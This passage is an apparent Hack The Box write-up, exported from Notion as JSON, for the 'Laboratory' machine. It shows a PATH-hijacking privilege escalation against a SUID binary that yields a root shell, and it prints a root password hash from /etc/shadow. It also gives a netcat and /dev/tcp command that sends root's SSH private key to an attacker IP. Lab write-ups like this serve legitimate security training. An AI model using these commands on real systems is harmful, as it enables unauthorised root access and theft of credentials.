group."]]},{"children":[],"uri":"https://www.notion.so/f84363a0459e4e4c9c2f1a8bb4af0ce5","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["It then calls "],["chmod",[["c",null]]],[", a Linux utility for modifying file permissions, on "],["/usr/bin/docker",[["c",null]]],[", which seems to have failed."]]},{"children":[],"uri":"https://www.notion.so/64f0cfd2643c4798b4867255bfeaf134","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["However, by exploiting the "],["$PATH",[["c",null]]],[" variable and creating our own malicious version of "],["chmod",[["c",null]]],[", we can leverage this binary call to have it execute arbitrary code as root."]]},{"children":[{"children":[],"uri":"https://www.notion.so/b3482af4e3094c9f88b44a64b30819ff","type":"text","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["$ mkdir /tmp/sup && cd /tmp/sup",[["c",null]]]]}],"uri":"https://www.notion.so/46e2295335d44568b003e4823ae2456b","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Create temporary directory:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/16867387bea147628a2aaa4d24a2828a","type":"text","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["$ echo \"/bin/bash\" > chmod",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/4230e6855c4241b79b98d09e10fd9459","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ chmod 777 ./chmod",[["c",null]]]]}],"uri":"https://www.notion.so/f02fe0db363f423982a98a7ec5ba3185","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Create bogus version of "],["chmod",[["c",null]]],[", and make it executable:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2bb16c592d0b4481957b1cedd7bab152","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ export PATH=/tmp/sup:$PATH",[["c",null]]]]}],"uri":"https://www.notion.so/5562067846b841a5902cbda79e44f9f9","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["Prepend the current directory to "],["$PATH",[["c",null]]],[", such that the malicious version takes priority over the real "],["chmod",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/21c955c7ce8f4159b773b3825812b95b","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ whoami && id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/e507454a53654da292aebf3ee94d709b","type":"code","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["root\nuid=0(root) gid=0(root) groups=0(root),1000(dexter)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/9c58732711fb4c818828ac78acf59197","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["Execute the "],["docker-security",[["c",null]]],[" binary again, and we now get a shell as the root user:"]]},{"children":[],"uri":"https://www.notion.so/f07d2711635c41d49b8d3eb64887bf12","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["Get root flag!"]]},{"children":[],"uri":"https://www.notion.so/5bbe1ef7a78f43a6902a18fbb7eb630c","type":"heading","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Persistence"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/657d45ce91ef45c29e17940e65a93921","type":"code","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["root:$6$AMvgOmRCNzBloX3T$rd5nRPwkBPHenf6VLHfsXb066LNq0MZBRYeEsuCZviD8nQGvVLMaW9iH1hb5FPHzdl.McOJ8GrFIFfdSnIo4t1:18439:0:99999:7:::"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/4168002b6615412cb097f6507a0636f2","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Get root user's hash from "],["/etc/shadow",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/9a4829689b33414c99d8398e12538e99","type":"text","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["$ nc -lvnp 6969 > ./id_rsa < /dev/null",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/6b77b37ef1a145678a28282ee789fac2","type":"text","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["$ cat /root/.ssh/id_rsa > /dev/tcp/10.10.14.103/6969",[["c",null]]]]}],"uri":"https://www.notion.so/a626f37e86f24ec8add68bd9859e4c3b","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Get root user's SSH key from "],["/root/.ssh/",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/f8f3ed05af5a45c98dc31ad2f5534bb5","type":"heading","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["Resources"]],"depth":2},{"children":[],"uri":"https://www.notion.so/5ff64263e0464931a4cfa515bb062780","type":"numbered_list","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["https://hackerone.com/reports/827052",[["a","https://hackerone.com/reports/827052"]]]]},{"children":[],"uri":"https://www.notion.so/9575826822004a9199a28b3d3ce36456","type":"numbered_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/",[["a","https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/"]]]]}],"uri":"https://www.notion.so/be38375b95324776b2e5dd354ea9ac64","type":"page","createdTime":1618674988797,"lastEditedTime":1618680900000,"title":[["Laboratory - 10.10.10.216"]],"icon":"https://www.hackthebox.eu/storage/avatars/97b6b79de818229932e1d9d645b50f62.png","fullWidth":true,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"'2]%":[["laboratory"]],"98uZ":[["Easy-difficulty Linux box with a focus on exploiting local file inclusion and insecure deserialisation vulnerabilities in GitLab 12.8.1. Privilege escalation by escaping the Docker container and abusing a SUID binary with a PATH hijacking attack."]],":H`m":[["Yes"]],"xY$N":[["‣",[["d",{"type":"datetime","time_zone":"Australia/Adelaide","start_date":"2021-04-18","start_time":"01:27"}]]]],"{iD?":[["Easy,Linux,GitLab,Docker,PATH Hijacking"]],"|Ay0":[["post"]],"title":[["Laboratory - 10.10.10.216"]],"34dcb6ea-0b54-4d5c-97f2-1b547c003948":[["Yes"]],"3fe3e3bf-9500-4abb-8acd-67aba88e6f47":[["https://www.hackthebox.eu/home/machines/profile/298",[["a","https://www.hackthebox.eu/home/machines/profile/298"]]]],"7df966e1-a25b-4512-8e5c-761390b4c971":[["‣",[["d",{"type":"datetimerange","end_date":"2021-01-23","end_time":"00:24","time_zone":"Australia/Adelaide","start_date":"2021-01-22","start_time":"02:27"}]]]],"91d2ba37-40ae-4835-a8e9-f8710a2ecaf6":[["Yes"]],"c8554f2b-cb52-4987-be70-6d00db874c2b":[["Yes"]]}}